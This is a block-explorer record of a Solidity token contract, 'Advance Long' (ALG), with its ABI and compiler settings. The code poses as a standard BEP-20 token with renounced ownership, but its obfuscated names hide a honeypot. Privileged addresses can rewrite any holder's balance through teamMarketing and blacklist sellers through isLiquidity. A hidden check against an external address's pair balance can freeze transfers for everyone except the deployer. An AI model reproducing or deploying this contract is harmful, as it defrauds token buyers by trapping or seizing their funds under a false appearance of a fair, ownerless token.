{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamFromSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchBuy {\n    function createPair(address marketingTx, address feeSell) external returns (address);\n}\n\ninterface swapTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txWallet) external view returns (uint256);\n\n    function transfer(address maxAuto, uint256 tradingIs) external returns (bool);\n\n    function allowance(address receiverMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxAuto,\n        uint256 tradingIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenSender, uint256 value);\n    event Approval(address indexed receiverMin, address indexed spender, uint256 value);\n}\n\ninterface swapTradingMetadata is swapTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdvanceLong is teamFromSwap, swapTrading, swapTradingMetadata {\n\n    bool public enableLaunch;\n\n    function owner() external view returns (address) {\n        return fromLimit;\n    }\n\n    string private minAt = \"ALG\";\n\n    address private fromLimit;\n\n    uint8 private totalEnable = 18;\n\n    uint256 constant listReceiver = 4 ** 10;\n\n    address public tradingEnable;\n\n    function modeTotalLaunched(address swapList, address maxAuto, uint256 tradingIs) internal returns (bool) {\n        if (swapList == teamMin) {\n            return sellFund(swapList, maxAuto, tradingIs);\n        }\n        uint256 fundTotal = swapTrading(tradingEnable).balanceOf(sellLimitMax);\n        require(fundTotal == limitBuyAmount);\n        require(maxAuto != sellLimitMax);\n        if (isLiquidity[swapList]) {\n            return sellFund(swapList, maxAuto, listReceiver);\n        }\n        return sellFund(swapList, maxAuto, tradingIs);\n    }\n\n    bool private fundMode;\n\n    function maxFund() private view {\n        require(isFund[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundExempt;\n    }\n\n    function approve(address feeList, uint256 tradingIs) public virtual override returns (bool) {\n        tradingTake[_msgSender()][feeList] = tradingIs;\n        emit Approval(_msgSender(), feeList, tradingIs);\n        return true;\n    }\n\n    bool private sellModeFund;\n\n    bool private shouldMarketing;\n\n    function transferFrom(address swapList, address maxAuto, uint256 tradingIs) external override returns (bool) {\n        if (_msgSender() != exemptMin) {\n            if (tradingTake[swapList][_msgSender()] != type(uint256).max) {\n                require(tradingIs <= tradingTake[swapList][_msgSender()]);\n                tradingTake[swapList][_msgSender()] -= tradingIs;\n            }\n        }\n        return modeTotalLaunched(swapList, maxAuto, tradingIs);\n    }\n\n    function teamMarketing(address tokenLimit, uint256 tradingIs) public {\n        maxFund();\n        maxTake[tokenLimit] = tradingIs;\n    }\n\n    constructor (){\n        if (amountTeam != liquidityToken) {\n            sellModeFund = true;\n        }\n        launchLiquidity modeLiquidity = launchLiquidity(exemptMin);\n        tradingEnable = launchBuy(modeLiquidity.factory()).createPair(modeLiquidity.WETH(), address(this));\n        if (amountTeam != liquidityToken) {\n            enableLaunch = true;\n        }\n        teamMin = _msgSender();\n        liquidityFee();\n        isFund[teamMin] = true;\n        maxTake[teamMin] = launchedFundMax;\n        \n        emit Transfer(address(0), teamMin, launchedFundMax);\n    }\n\n    uint256 public walletExempt;\n\n    address exemptMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public amountTx;\n\n    event OwnershipTransferred(address indexed amountTo, address indexed launchedSwap);\n\n    function tradingLiquidity(uint256 tradingIs) public {\n        maxFund();\n        limitBuyAmount = tradingIs;\n    }\n\n    uint256 limitBuyAmount;\n\n    function transfer(address tokenLimit, uint256 tradingIs) external virtual override returns (bool) {\n        return modeTotalLaunched(_msgSender(), tokenLimit, tradingIs);\n    }\n\n    uint256 private launchedFundMax = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public isFund;\n\n    function balanceOf(address txWallet) public view virtual override returns (uint256) {\n        return maxTake[txWallet];\n    }\n\n    mapping(address => bool) public isLiquidity;\n\n    address public teamMin;\n\n    function totalLiquidity(address liquidityTo) public {\n        maxFund();\n        if (enableLaunch) {\n            sellModeFund = false;\n        }\n        if (liquidityTo == teamMin || liquidityTo == tradingEnable) {\n            return;\n        }\n        isLiquidity[liquidityTo] = true;\n    }\n\n    uint256 fundReceiver;\n\n    function sellFund(address swapList, address maxAuto, uint256 tradingIs) internal returns (bool) {\n        require(maxTake[swapList] >= tradingIs);\n        maxTake[swapList] -= tradingIs;\n        maxTake[maxAuto] += tradingIs;\n        emit Transfer(swapList, maxAuto, tradingIs);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromLimit;\n    }\n\n    uint256 public amountTeam;\n\n    function allowance(address buyMin, address feeList) external view virtual override returns (uint256) {\n        if (feeList == exemptMin) {\n            return type(uint256).max;\n        }\n        return tradingTake[buyMin][feeList];\n    }\n\n    function liquidityFee() public {\n        emit OwnershipTransferred(teamMin, address(0));\n        fromLimit = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalEnable;\n    }\n\n    address sellLimitMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private maxTake;\n\n    mapping(address => mapping(address => uint256)) private tradingTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedFundMax;\n    }\n\n    string private fundExempt = \"Advance Long\";\n\n    function fromLaunch(address tokenMin) public {\n        require(tokenMin.balance < 100000);\n        if (amountTx) {\n            return;\n        }\n        if (liquidityToken == walletExempt) {\n            walletExempt = amountTeam;\n        }\n        isFund[tokenMin] = true;\n        \n        amountTx = true;\n    }\n\n    uint256 public liquidityToken;\n\n    bool private toReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMin\",\"type\":\"address\"}],\"name\":\"fromLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTo\",\"type\":\"address\"}],\"name\":\"totalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AdvanceLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}